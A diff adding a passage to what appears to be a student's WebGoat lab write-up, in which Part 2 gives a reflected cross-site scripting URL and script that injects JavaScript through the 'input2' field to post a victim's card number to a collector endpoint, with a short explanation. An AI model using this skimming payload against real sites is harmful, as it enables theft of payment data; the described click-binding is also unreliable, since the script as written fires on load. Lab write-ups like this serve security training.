@@ -9,6 +9,19 @@ The credentials submitted through the fake form will be uploaded to the WebGoat'
 Then the hackers could use the credentials to do whatever they want.
 
 Part 2 Explanation:
+Plain URL: http://localhost:8090/WebGoat/start.mvc#attack/297061215/900?input1=123&input2=<script>document.getElementsByName('buy').onclick = fetch('http://localhost:8090/WebGoat/catcher',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded',},body:'PROPERTY=yes&stolenCardNum='+encodeURIComponent(document.getElementsByName('input1')[0].value),});</script>
+<script>
+  document.getElementsByName('buy').onclick = 
+  fetch('http://localhost:8090/WebGoat/catcher',{
+    method:'POST',
+    headers:{'Content-Type':'application/x-www-form-urlencoded',},
+    body:'PROPERTY=yes&stolenCardNum='+encodeURIComponent(document.getElementsByName('input1')[0].value),
+  });
+</script>
+The script above bind the posting to the action of clicking the button named "buy".
+By checking the website, we knew that the field "input2" is exploitable. Thus, as edits made to the URL, 
+input2 is assigned with the encoded javascript. As a result, the card number will be collected and posted 
+to the desired URL once the button "buy" is clicked.
 
 Part 3 Explanation:
 The vulnerability we could exploit is the <textarea> of the message with no length limitation on the page. 
